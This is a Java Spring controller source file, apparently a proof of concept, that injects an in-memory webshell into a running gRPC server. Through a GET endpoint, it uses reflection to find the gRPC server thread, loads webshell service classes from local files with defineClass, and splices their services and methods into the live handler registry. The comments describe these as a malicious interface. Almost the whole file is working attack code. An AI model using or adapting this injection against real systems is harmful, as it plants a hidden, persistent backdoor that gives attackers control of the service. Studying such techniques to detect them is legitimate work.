package com.demo.shell.controller;


import com.demo.shell.test.NsServer;
import io.grpc.Server;
import io.grpc.ServerBuilder;
import io.grpc.ServerMethodDefinition;
import io.grpc.ServerServiceDefinition;
import io.grpc.internal.ServerImpl;
import net.devh.boot.grpc.server.serverfactory.GrpcServerLifecycle;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.*;

@RestController
@RequestMapping("user")
public class UserController {
    @GetMapping("name")
    public String getUser() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException, InvocationTargetException, NoSuchMethodException {

        ThreadGroup group = Thread.currentThread().getThreadGroup();
        Thread[] threads = new Thread[group.activeCount()];
        String status = "";

        group.enumerate(threads);

        for(Thread t : threads){
            if(t.getName().startsWith("grpc-server-container")){
                System.out.println("found grpc-server-container: " + t.getName());

                Field target = Thread.class.getDeclaredField("target");
                target.setAccessible(true);
                Object o = target.get(t);

                //这里是一个GrpcServerLifecycle$lambda，遍历拿到里面的GrpcServerLifecycle
                Field[] ff = o.getClass().getDeclaredFields();
                ff[0].setAccessible(true);
                GrpcServerLifecycle grpcServerLifecycle = (GrpcServerLifecycle)ff[0].get(o);

                // 通过GrpcServerLifecycle，反射获取 server对象
                Field server = GrpcServerLifecycle.class.getDeclaredField("server");
                server.setAccessible(true);
                ServerImpl serverimpl = (ServerImpl) server.get(grpcServerLifecycle);

                load_depend();
                inject(serverimpl);
                status = "inject success";
                System.out.println(status);
                break;
            }
        }
        if(status.equals("")){
            status = "not suceesss, but no error, maybe not find grpc-server-container thread";
        }

        return status;
    }

    public void load_depend() throws IOException, InvocationTargetException, NoSuchMethodException, IllegalAccessException {
        // 注入强依赖
        loadTargetClass("com.demo.shell.protocol.WebShellServiceGrpc$MethodHandlers", "/Users/yps/Public/Code/JavaProject/grpc/src/main/resources/WebShellServiceGrpc$MethodHandlers.class");
        loadTargetClass("com.demo.shell.protocol.WebShellServiceGrpc$WebShellServiceBaseDescriptorSupplier", "/Users/yps/Public/Code/JavaProject/grpc/src/main/resources/WebShellServiceGrpc$WebShellServiceBaseDescriptorSupplier.class");
        loadTargetClass("com.demo.shell.protocol.WebShellServiceGrpc$WebShellServiceMethodDescriptorSupplier", "/Users/yps/Public/Code/JavaProject/grpc/src/main/resources/WebShellServiceGrpc$WebShellServiceMethodDescriptorSupplier.class");
        loadTargetClass("com.demo.shell.protocol.WebShellServiceGrpc$WebShellServiceFileDescriptorSupplier", "/Users/yps/Public/Code/JavaProject/grpc/src/main/resources/WebShellServiceGrpc$WebShellServiceFileDescriptorSupplier.class");
        loadTargetClass("com.demo.shell.protocol.WebShellServiceGrpc", "/Users/yps/Public/Code/JavaProject/grpc/src/main/resources/WebShellServiceGrpc.class");
        loadTargetClass("com.demo.shell.protocol.Webshell$1", "/Users/yps/Public/Code/JavaProject/grpc/src/main/resources/Webshell$1.class");
        loadTargetClass("com.demo.shell.protocol.WebShellServiceGrpc$WebShellServiceImplBase","/Users/yps/Public/Code/JavaProject/grpc/src/main/resources/WebShellServiceGrpc$WebShellServiceImplBase.class");
        loadTargetClass("com.demo.shell.protocol.WebshellOrBuilder","/Users/yps/Public/Code/JavaProject/grpc/src/main/resources/WebshellOrBuilder.class");
        loadTargetClass("com.demo.shell.protocol.Webshell", "/Users/yps/Public/Code/JavaProject/grpc/src/main/resources/Webshell.class");

        //执行依赖
        loadTargetClass("com.demo.shell.protocol.Webshell$Builder", "/Users/yps/Public/Code/JavaProject/grpc/src/main/resources/Webshell$Builder.class");

    }

    public void inject(Server server) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InstantiationException, IOException, InvocationTargetException, NoSuchMethodException {

        //首先加载可能需要的各种依赖


        // 从server中获取registry
        Field registry = server.getClass().getDeclaredField("registry");
        registry.setAccessible(true);
        Object handlerRegistry = registry.get(server);

        // 从registry获取services和methods
        Class InternalHandlerRegistry = Class.forName("io.grpc.internal.InternalHandlerRegistry");
        Field services = InternalHandlerRegistry.getDeclaredField("services");
        services.setAccessible(true);
        List<ServerServiceDefinition> ser = (List<ServerServiceDefinition>)services.get(handlerRegistry);

        Field methods = InternalHandlerRegistry.getDeclaredField("methods");
        methods.setAccessible(true);
        Map<String, ServerMethodDefinition<?, ?>> meth = (Map<String, ServerMethodDefinition<?, ?>>)methods.get(handlerRegistry);

        io.grpc.BindableService webshell = (io.grpc.BindableService)loadTargetClass("com.demo.shell.service.WebshellServiceImpl","/Users/yps/Public/Code/JavaProject/grpc/src/main/resources/WebshellServiceImpl.class").newInstance();

        // 初始化一个带有恶意接口的Server对象，并获取其中的services和methods，添加到当前服务中
        Server hr = ServerBuilder.forPort(8082).addService(webshell).build();

        Object hr_registry = getField(hr,"registry");
        List<ServerServiceDefinition> webshell_ser_list = (List<ServerServiceDefinition>)services.get(hr_registry);
        Map<String, ServerMethodDefinition<?, ?>> webshell_meth = (Map<String, ServerMethodDefinition<?, ?>>)methods.get(hr_registry);

        //浅拷贝把原来的接口信息都复制到新的对象中
        List<ServerServiceDefinition> new_ser = new ArrayList<>(ser);
        Map new_meth = new HashMap(meth);

        // 把恶意对象的信息添加到新的对象
        for(ServerServiceDefinition ssd : webshell_ser_list){
            new_ser.add(ssd);
        }

        for(String key : webshell_meth.keySet()){
            new_meth.put(key,webshell_meth.get(key));
        }

        // 反射把registry的services和methods都替换为新创建的对象
        services.set(handlerRegistry, new_ser);
        methods.set(handlerRegistry, new_meth);

    }

    public Class loadTargetClass(String className, String classPath) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        FileInputStream f = new FileInputStream(classPath);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        byte[] buff = new byte[1024];
        int length = 0;

        while ((length = f.read(buff)) != -1){
            bos.write(buff, 0 ,length);
        }

        byte[] bytes = bos.toByteArray();

        Method define = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        define.setAccessible(true);
        Class c1 = (Class)define.invoke(this.getClass().getClassLoader(),className, bytes, 0,bytes.length);


        return c1;
    }

    public Object getField(Object object,String FieldName) throws NoSuchFieldException, IllegalAccessException {
        Field f = object.getClass().getDeclaredField(FieldName);
        f.setAccessible(true);
        Object o = f.get(object);
        return o;
    }

}